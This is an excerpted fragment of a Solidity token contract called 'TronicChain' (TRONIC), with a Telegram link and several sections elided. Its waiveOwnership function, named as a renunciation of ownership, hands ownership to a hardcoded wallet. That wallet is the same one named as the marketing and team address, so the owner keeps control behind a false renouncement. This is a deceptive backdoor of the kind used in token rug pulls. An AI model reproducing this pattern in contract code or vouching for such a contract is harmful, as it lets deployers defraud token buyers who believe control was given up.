...
/**
Telegram : https://t.me/tronicchain
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5Cb44BA85f9F992E34C44B0e1A567bDA35e2dd6f);
    }
...
contract TronicChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "WTronic Chain";
    string private _symbol = "TRONIC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5Cb44BA85f9F992E34C44B0e1A567bDA35e2dd6f);
    address payable public teamWalletAddress = payable(0x5Cb44BA85f9F992E34C44B0e1A567bDA35e2dd6f);
